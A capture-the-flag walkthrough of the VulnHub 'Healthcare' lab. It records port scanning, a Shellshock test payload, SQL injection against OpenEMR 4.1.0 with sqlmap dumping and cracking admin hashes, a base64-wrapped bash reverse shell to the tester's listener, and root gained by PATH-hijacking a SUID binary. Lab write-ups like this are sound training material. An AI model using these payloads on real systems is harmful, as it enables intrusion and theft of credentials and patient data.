# Ports Scan & Enumeration
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ nmap -Pn -p- 192.168.59.159
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-10 10:44 AEST
Nmap scan report for 192.168.59.159
Host is up (0.0031s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds

┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ nmap -Pn -p21,80 -A 192.168.59.159
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-10 10:49 AEST
Nmap scan report for 192.168.59.159
Host is up (0.0054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds

┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ nikto -host 192.168.59.159
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.59.159
+ Target Hostname:    192.168.59.159
+ Target Port:        80
+ Start Time:         2021-05-10 10:51:32 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 17:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-05-10 10:52:46 (GMT10) (74 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- FTP can't login by anonymous.
```bash
┌──(htb㉿kali)-[~]
└─$ ftp 192.168.59.159
Connected to 192.168.59.159.
220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.59.159]
Name (192.168.59.159:htb): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
530 Please login with USER and PASS
ftp: bind: Address already in use
ftp> quit
221 Goodbye.
```

## Web Service Enumeration
```bash
└─$ gobuster dir -u http://192.168.59.159/ -x txt,html,htm,php,jsp,asp,aspx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.59.159/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,htm,php,jsp,asp,aspx
[+] Timeout:                 10s
===============================================================
2021/05/10 11:06:06 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 344] [--> http://192.168.59.159/images/]
/index.html           (Status: 200) [Size: 5031]
/css                  (Status: 301) [Size: 341] [--> http://192.168.59.159/css/]
/js                   (Status: 301) [Size: 340] [--> http://192.168.59.159/js/]
/vendor               (Status: 301) [Size: 344] [--> http://192.168.59.159/vendor/]
/favicon              (Status: 200) [Size: 1406]
/robots.txt           (Status: 200) [Size: 620]
/robots               (Status: 200) [Size: 620]
/fonts                (Status: 301) [Size: 343] [--> http://192.168.59.159/fonts/]
/gitweb               (Status: 301) [Size: 344] [--> http://192.168.59.159/gitweb/]
/server-status        (Status: 403) [Size: 1000]
/phpMyAdmin           (Status: 403) [Size: 59]

===============================================================
2021/05/10 11:45:13 Finished
===============================================================
```

- robots.txt
```bash
└─$ curl -s http://192.168.59.159/robots.txt
# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
# exclude help system from robots
User-agent: *
Disallow: /manual/
Disallow: /manual-2.2/
Disallow: /addon-modules/
Disallow: /doc/
Disallow: /images/
# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
Disallow: /all_our_e-mail_addresses
# same idea here...
Disallow: /admin/
# but allow htdig to index our doc-tree
#User-agent: htdig
#Disallow:
# disallow stress test
user-agent: stress-agent
Disallow: /

└─$ curl -s http://192.168.59.159/addon-modules/
This directory can only be viewed from localhost.


```

- most of the folder is access denied, some of them is only access by localhost
![](Pasted%20image%2020210510112654.png)
- Tried socat, but seems not work.
```bash
└─$ socat TCP-LISTEN:80,fork,reuseaddr TCP:192.168.59.159:80 &
[1] 12321
```
![](Pasted%20image%2020210510113213.png)
- not working even after I changed my /etc/hosts to make target box localhost.
![](Pasted%20image%2020210510114218.png)

- nikto remind us that there might be shellshock vulnerability, but seems not work either.
![](Pasted%20image%2020210510114946.png)
```bash
└─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.59.159/cgi-bin/test.cgi
<b>Date: Mon May 10 03:01:09 2021</b><br>
<hr><h1>It worked!</h1>
This script runs under: CGI/1.1<hr></n%ENV: <br>
SCRIPT_NAME = /cgi-bin/test.cgi <br>
SERVER_NAME = (Hidden for security purposes) <br>
SERVER_ADMIN = (Hidden for security purposes) <br>
REQUEST_METHOD = GET <br>
HTTP_ACCEPT = */* <br>
SCRIPT_FILENAME = (Hidden for security purposes) <br>
SERVER_SOFTWARE = (Hidden for security purposes) <br>
QUERY_STRING =  <br>
REMOTE_PORT = 44458 <br>
HTTP_USER_AGENT = '() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id <br>'
SERVER_SIGNATURE = Apache-AdvancedExtranetServer (Complete info hidden) <br>
SERVER_PORT = (Hidden for security purposes) <br>
REMOTE_ADDR = 192.168.59.60 <br>
SERVER_PROTOCOL = HTTP/1.1 <br>
PATH = (Hidden for security purposes) <br>
REQUEST_URI = /cgi-bin/test.cgi <br>
GATEWAY_INTERFACE = CGI/1.1 <br>
SERVER_ADDR = (Hidden for security purposes) <br>
DOCUMENT_ROOT = (Hidden for security purposes) <br>
HTTP_HOST = 192.168.59.159 <br>
MOD_PERL = (Hidden for security purposes) <br>
UNIQUE_ID = YJkEZX8AAAEAAAl@QYsAAAAC <br>
```

- But does "It worked!" mean anything? no clue at all, use bigger wordlist to try again....
```bash
┌──(htb㉿kali)-[/opt]
└─$ dirsearch -u http://192.168.59.159 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 1273434

Output File: /home/htb/.dirsearch/reports/192.168.59.159/_21-05-10_15-25-58.txt

Error Log: /home/htb/.dirsearch/logs/errors-21-05-10_15-25-58.log

Target: http://192.168.59.159/

[15:25:58] Starting:
[15:25:58] 200 -    5KB - /index
[15:25:58] 301 -  344B  - /images  ->  http://192.168.59.159/images/
[15:26:01] 301 -  341B  - /css  ->  http://192.168.59.159/css/
[15:26:04] 301 -  340B  - /js  ->  http://192.168.59.159/js/
[15:26:07] 301 -  344B  - /vendor  ->  http://192.168.59.159/vendor/
[15:26:08] 200 -    1KB - /favicon
[15:26:08] 200 -  620B  - /robots
[15:26:16] 301 -  343B  - /fonts  ->  http://192.168.59.159/fonts/
[15:29:50] 301 -  344B  - /gitweb  ->  http://192.168.59.159/gitweb/
[15:35:01] 403 -   59B  - /phpMyAdmin
[15:38:18] 403 - 1000B  - /server-status
[16:26:36] 403 - 1000B  - /server-info
[17:23:42] 301 -  345B  - /openemr  ->  http://192.168.59.159/openemr/

Task Completed
```
- We have OpenEMR
![](Pasted%20image%2020210510172840.png)

# OpenEMR
```bash
┌──(htb㉿kali)-[/usr/…/wordlists/seclists/Discovery/Web-Content]
└─$ searchsploit openemr 4.1.0
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
OpenEMR 4.1.0 - 'u' SQL Injection                                                 | php/webapps/49742.py
OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution                           | php/webapps/45161.py
Openemr-4.1.0 - SQL Injection                                                     | php/webapps/17998.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- 49742 has a link: `http://<siteip>/openemr/interface/login/validateUser.php?u=`
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ sqlmap -r req --dbms=mysql --dbs --batch
---
[17:23:38] [INFO] testing MySQL
[17:23:38] [WARNING] reflective value(s) found and filtering out
[17:23:38] [INFO] confirming MySQL
[17:23:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux
web application technology: Apache 2.2.17, PHP 5.3.3
back-end DBMS: MySQL >= 5.0.0
[17:23:39] [INFO] fetching database names
[17:23:39] [INFO] retrieved: 'information_schema'
[17:23:39] [INFO] retrieved: 'openemr'
[17:23:39] [INFO] retrieved: 'test'
available databases [3]:
[*] information_schema
[*] openemr
[*] test

[17:23:39] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.59.159'

[*] ending @ 17:23:39 /2021-05-10/
```
- Now we can do more.
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ sqlmap -r req --dbms=mysql -D openemr --tables --batch
Database: openemr
[141 tables]
+---------------------------------+
| array                           |
| groups                          |
| log                             |
| version                         |
| addresses                       |
| amc_misc_data                   |
| ar_activity                     |
| ar_session                      |
| audit_details                   |
| audit_master                    |
| automatic_notification          |
| batchcom                        |
| billing                         |
| categories                      |
| categories_seq                  |
| categories_to_documents         |
| chart_tracker                   |
| claims                          |
| clinical_plans                  |
| clinical_plans_rules            |
| clinical_rules                  |
| code_types                      |
| codes                           |
| config                          |
| config_seq                      |
| customlists                     |
| documents                       |
| documents_legal_categories      |
| documents_legal_detail          |
| documents_legal_master          |
| drug_inventory                  |
| drug_sales                      |
| drug_templates                  |
| drugs                           |
| eligibility_response            |
| eligibility_verification        |
| employer_data                   |
| enc_category_map                |
| extended_log                    |
| facility                        |
| fee_sheet_options               |
| form_dictation                  |
| form_encounter                  |
| form_misc_billing_options       |
| form_reviewofs                  |
| form_ros                        |
| form_soap                       |
| form_vitals                     |
| forms                           |
| gacl_acl                        |
| gacl_acl_sections               |
| gacl_acl_seq                    |
| gacl_aco                        |
| gacl_aco_map                    |
| gacl_aco_sections               |
| gacl_aco_sections_seq           |
| gacl_aco_seq                    |
| gacl_aro                        |
| gacl_aro_groups                 |
| gacl_aro_groups_id_seq          |
| gacl_aro_groups_map             |
| gacl_aro_map                    |
| gacl_aro_sections               |
| gacl_aro_sections_seq           |
| gacl_aro_seq                    |
| gacl_axo                        |
| gacl_axo_groups                 |
| gacl_axo_groups_map             |
| gacl_axo_map                    |
| gacl_axo_sections               |
| gacl_groups_aro_map             |
| gacl_groups_axo_map             |
| gacl_phpgacl                    |
| geo_country_reference           |
| geo_zone_reference              |
| globals                         |
| gprelations                     |
| history_data                    |
| immunizations                   |
| insurance_companies             |
| insurance_data                  |
| insurance_numbers               |
| integration_mapping             |
| issue_encounter                 |
| lang_constants                  |
| lang_custom                     |
| lang_definitions                |
| lang_languages                  |
| layout_options                  |
| lbf_data                        |
| list_options                    |
| lists                           |
| lists_touch                     |
| notes                           |
| notification_log                |
| notification_settings           |
| onotes                          |
| openemr_module_vars             |
| openemr_modules                 |
| openemr_postcalendar_categories |
| openemr_postcalendar_events     |
| openemr_postcalendar_limits     |
| openemr_postcalendar_topics     |
| openemr_session_info            |
| patient_access_offsite          |
| patient_access_onsite           |
| patient_data                    |
| patient_reminders               |
| payments                        |
| pharmacies                      |
| phone_numbers                   |
| pma_bookmark                    |
| pma_column_info                 |
| pma_history                     |
| pma_pdf_pages                   |
| pma_relation                    |
| pma_table_coords                |
| pma_table_info                  |
| pnotes                          |
| prescriptions                   |
| prices                          |
| procedure_order                 |
| procedure_report                |
| procedure_result                |
| procedure_type                  |
| registry                        |
| rule_action                     |
| rule_action_item                |
| rule_filter                     |
| rule_patient_data               |
| rule_reminder                   |
| rule_target                     |
| sequences                       |
| standardized_tables_track       |
| syndromic_surveillance          |
| template_users                  |
| transactions                    |
| user_settings                   |
| users                           |
| users_facility                  |
| x12_partners                    |
+---------------------------------+

[17:25:30] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.59.159'

[*] ending @ 17:25:30 /2021-05-10/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ sqlmap -r req --dbms=mysql -D openemr -T users --columns  --batch
Database: openemr
Table: users
[53 columns]
+----------------------+--------------+
| Column               | Type         |
+----------------------+--------------+
| abook_type           | varchar(31)  |
| active               | tinyint(1)   |
| assistant            | varchar(255) |
| authorized           | tinyint(4)   |
| billname             | varchar(255) |
| cal_ui               | tinyint(4)   |
| calendar             | tinyint(1)   |
| city                 | varchar(30)  |
| city2                | varchar(30)  |
| default_warehouse    | varchar(31)  |
| email                | varchar(255) |
| facility             | varchar(255) |
| facility_id          | int(11)      |
| fax                  | varchar(30)  |
| federaldrugid        | varchar(255) |
| federaltaxid         | varchar(255) |
| fname                | varchar(255) |
| id                   | bigint(20)   |
| info                 | longtext     |
| irnpool              | varchar(31)  |
| lname                | varchar(255) |
| mname                | varchar(255) |
| newcrop_user_role    | varchar(30)  |
| notes                | text         |
| npi                  | varchar(15)  |
| organization         | varchar(255) |
| password             | longtext     |
| phone                | varchar(30)  |
| phonecell            | varchar(30)  |
| phonew1              | varchar(30)  |
| phonew2              | varchar(30)  |
| pwd_expiration_date  | date         |
| pwd_history1         | longtext     |
| pwd_history2         | longtext     |
| see_auth             | int(11)      |
| source               | tinyint(4)   |
| specialty            | varchar(255) |
| ssi_relayhealth      | varchar(64)  |
| state                | varchar(30)  |
| state2               | varchar(30)  |
| state_license_number | varchar(25)  |
| street               | varchar(60)  |
| street2              | varchar(60)  |
| streetb              | varchar(60)  |
| streetb2             | varchar(60)  |
| taxonomy             | varchar(30)  |
| title                | varchar(30)  |
| upin                 | varchar(255) |
| url                  | varchar(255) |
| username             | varchar(255) |
| valedictory          | varchar(255) |
| zip                  | varchar(20)  |
| zip2                 | varchar(20)  |
+----------------------+--------------+

[17:26:29] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.59.159'

[*] ending @ 17:26:29 /2021-05-10/

┌──(htb㉿kali)-[~/Writeups/VulnHub/Healthcare]
└─$ sqlmap -r req --dbms=mysql -D openemr -T users -C username,password --dump
---
[17:27:17] [INFO] testing MySQL
[17:27:17] [INFO] confirming MySQL
[17:27:17] [WARNING] reflective value(s) found and filtering out
[17:27:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux
web application technology: Apache 2.2.17, PHP 5.3.3
back-end DBMS: MySQL >= 5.0.0
[17:27:17] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'openemr'
[17:27:17] [INFO] retrieved: '3863efef9ee2bfbc51ecdca359c6302bed1389e8'
[17:27:17] [INFO] retrieved: 'admin'
[17:27:17] [INFO] retrieved: 'ab24aed5a7c4ad45615cd7e0da816eea39e4895d'
[17:27:17] [INFO] retrieved: 'medical'
[17:27:17] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[17:27:21] [INFO] writing hashes to a temporary file '/tmp/sqlmapnhs84tfr1338256/sqlmaphashes-e9a8q0mv.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[17:27:23] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[17:27:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[17:27:25] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[17:27:25] [INFO] starting 2 processes
[17:27:43] [INFO] cracked password 'ackbar' for user 'admin'
[17:28:38] [INFO] cracked password 'medical' for user 'medical'
Database: openemr
Table: users
[2 entries]
+----------+----------------------------------------------------+
| username | password                                           |
+----------+----------------------------------------------------+
| admin    | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 (ackbar)  |
| medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d (medical) |
+----------+----------------------------------------------------+

[18:05:40] [INFO] table 'openemr.users' dumped to CSV file '/home/htb/.local/share/sqlmap/output/192.168.59.159/dump/openemr/users.csv'
[18:05:40] [INFO] fetched data logged to text files under '/home/htb/.local/share/sqlmap/output/192.168.59.159'

[*] ending @ 18:05:40 /2021-05-10/
```
- DB test is empty.
- sqlmap is still cracking further users' password (cancelled by me), but I don't think that's necessary since we had already have the user admin's credential. And successfully login.
![](Pasted%20image%2020210510180325.png)
- Tried to use the exploit python script do the job, but always got this error:
```bash
Traceback (most recent call last):
  File "/tmp/45161.py", line 136, in <module>
    _cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
  File "/usr/lib/python3.9/base64.py", line 58, in b64encode


    encoded = binascii.b2a_base64(s, newline=False)
TypeError: a bytes-like object is required, not 'str'


Traceback (most recent call last):
  File "/tmp/45161.py", line 136, in <module>
    _cmd = "|| echo " + base64.b64encode(bytes(args.cmd)) + "|base64 -d|bash"
TypeError: string argument without an encoding


Traceback (most recent call last):
  File "/tmp/45161.py", line 136, in <module>
    _cmd = "|| echo " + base64.b64encode(args.cmd.encoding('utf-8')) + "|base64 -d|bash"
AttributeError: 'str' object has no attribute 'encoding'
```
- So I have to study it for manual hacking. Since in script 'form284' is for payload, I located form283 and form285.
![](Pasted%20image%2020210510183624.png)
- According to the context here, we can locate that the form284 is the **Hylafax Server**:
![](Pasted%20image%2020210510183717.png)
- So we put our payload in here:
```bash
┌──(htb㉿kali)-[/tmp]
└─$ echo 'bash -i >& /dev/tcp/192.168.59.60/9001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjYwLzkwMDEgMD4mMQo=
```
- Listen on the port, then load the trigger page:
http://192.168.59.159/openemr/interface/main/daemon_frame.php
- We got the reverse shell.

-------------------------------------------
- There's another way to get reverse shell, with openEMR administration menu > other menu item, user admin has the ability to edit files.
![](Pasted%20image%2020210511114541.png)
- By testing it can upload any file without check extension, anyway, my php file is successfully uploaded, the only trick is, it wouold put the file to images folder, the path to access it would be:
http://192.168.59.159/openemr/sites/default/images/
![](Pasted%20image%2020210511114851.png)
![](Pasted%20image%2020210511114952.png)

# Privesc
## Reconn
```bash
bash-4.1$ id
id
uid=479(apache) gid=416(apache) groups=416(apache)

bash-4.1$ grep bash /etc/passwd
grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
mysql:x:492:488:system user for mysql:/var/lib/mysql:/bin/bash
medical:x:500:500:PCLinuxOS Medical:/home/medical:/bin/bash
almirant:x:501:502:Almirant:/home/almirant:/bin/bash

bash-4.1$ cat almirant/user.txt
cat almirant/user.txt
d41d8cd98f00b204e9800998ecf8427e

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root   man         43K Jan 17  2011 /usr/bin/man
-rwsr-sr-x 1 root   root       5.7K Jul 29  2020 /usr/bin/healthcheck
  --- It looks like /usr/bin/healthcheck is executing clear and you can impersonate it (strings line: clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h)

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root apache 2209 Oct 27  2011 /etc/phpMyAdmin/config.php
```

- target box did not set pager like less and more. So man is not work that perfectly.
- launch healthcheck try to see what's going on:
```bash
bash-4.1$ /usr/bin/healthcheck
/usr/bin/healthcheck
System Health Check

Scanning System
eth0      Link encap:Ethernet  HWaddr 00:0C:29:C3:AC:ED
          inet addr:192.168.59.159  Bcast:192.168.59.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fec3:aced/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:9980306 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9321448 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1737223368 (1.6 GiB)  TX bytes:3889058971 (3.6 GiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1536 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1536 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:167424 (163.5 KiB)  TX bytes:167424 (163.5 KiB)


Disk /dev/sda: 10.7 GB, 10737418240 bytes
255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *          63    18876374     9438156   83  Linux
/dev/sda2        18876375    20964824     1044225    5  Extended
/dev/sda5        18876438    20964824     1044193+  82  Linux swap / Solaris
200K    ./calendar/includes
44K     ./calendar/modules/PostCalendar/pnlang/eng
48K     ./calendar/modules/PostCalendar/pnlang
68K     ./calendar/modules/PostCalendar/plugins
32K     ./calendar/modules/PostCalendar/docs
20K     ./calendar/modules/PostCalendar/pnimages
8.0K    ./calendar/modules/PostCalendar/pntemplates/cache
44K     ./calendar/modules/PostCalendar/pntemplates/compiled/%%514/%%514181353
48K     ./calendar/modules/PostCalendar/pntemplates/compiled/%%514
8.0K    ./calendar/modules/PostCalendar/pntemplates/compiled/%%164/%%1643473877
12K     ./calendar/modules/PostCalendar/pntemplates/compiled/%%164
8.0K    ./calendar/modules/PostCalendar/pntemplates/compiled/%%154/%%1542843037
12K     ./calendar/modules/PostCalendar/pntemplates/compiled/%%154
80K     ./calendar/modules/PostCalendar/pntemplates/compiled
40K     ./calendar/modules/PostCalendar/pntemplates/default/style
52K     ./calendar/modules/PostCalendar/pntemplates/default/views/day_print
60K     ./calendar/modules/PostCalendar/pntemplates/default/views/week
96K     ./calendar/modules/PostCalendar/pntemplates/default/views/day
16K     ./calendar/modules/PostCalendar/pntemplates/default/views/calendarblock
52K     ./calendar/modules/PostCalendar/pntemplates/default/views/month
8.0K    ./calendar/modules/PostCalendar/pntemplates/default/views/year
56K     ./calendar/modules/PostCalendar/pntemplates/default/views/week_print
36K     ./calendar/modules/PostCalendar/pntemplates/default/views/global
36K     ./calendar/modules/PostCalendar/pntemplates/default/views/month_print
424K    ./calendar/modules/PostCalendar/pntemplates/default/views
120K    ./calendar/modules/PostCalendar/pntemplates/default/images
52K     ./calendar/modules/PostCalendar/pntemplates/default/admin
88K     ./calendar/modules/PostCalendar/pntemplates/default/user
16K     ./calendar/modules/PostCalendar/pntemplates/default/config
744K    ./calendar/modules/PostCalendar/pntemplates/default
836K    ./calendar/modules/PostCalendar/pntemplates
20K     ./calendar/modules/PostCalendar/pnblocks
12K     ./calendar/modules/PostCalendar/pnincludes/Benchmark
52K     ./calendar/modules/PostCalendar/pnincludes/Date
152K    ./calendar/modules/PostCalendar/pnincludes/Smarty/plugins
304K    ./calendar/modules/PostCalendar/pnincludes/Smarty
472K    ./calendar/modules/PostCalendar/pnincludes
1.9M    ./calendar/modules/PostCalendar
1.9M    ./calendar/modules
52K     ./calendar/pnadodb/datadict
288K    ./calendar/pnadodb/drivers
12K     ./calendar/pnadodb/lang
1.1M    ./calendar/pnadodb
3.3M    ./calendar
16K     ./onotes
32K     ./messages
16K     ./finder/pic
56K     ./finder
24K     ./authorizations
3.6M    .
```

- So the strings line confirmed.
`clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h`
- we can see all the command is not launch by absolute path, this would be our way in.
```bash
┌──(htb㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.59.60] from (UNKNOWN) [192.168.59.159] 59742
bash: no job control in this shell
bash-4.1$ cd /dev/shm
cd /dev/shm
bash-4.1$ export PATH=/dev/shm:$PATH
export PATH=/dev/shm:$PATH
bash-4.1$ echo 'id' > ifconfig
echo 'netstat' > ifconfig
bash-4.1$ chmod +x ifconfig
chmod +x ifconfig
bash-4.1$ /usr/bin/healthcheck
/usr/bin/healthcheck
TERM environment variable not set.
System Health Check

Scanning System
uid=0(root) gid=0(root) groups=0(root),416(apache)

Disk /dev/sda: 10.7 GB, 10737418240 bytes
255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *          63    18876374     9438156   83  Linux
/dev/sda2        18876375    20964824     1044225    5  Extended
/dev/sda5        18876438    20964824     1044193+  82  Linux swap / Solaris
4.0K    .
```

- We can see that `ifconfig` output is changed to `id` output now, and it's user root. The only thing next is to get shell.
```bash
bash-4.1$ echo 'bash' > ifconfig
echo 'bash' > ifconfig
bash-4.1$ /usr/bin/healthcheck
/usr/bin/healthcheck
TERM environment variable not set.
System Health Check

Scanning System
id
uid=0(root) gid=0(root) groups=0(root),416(apache)
cd /root
cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          


Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
```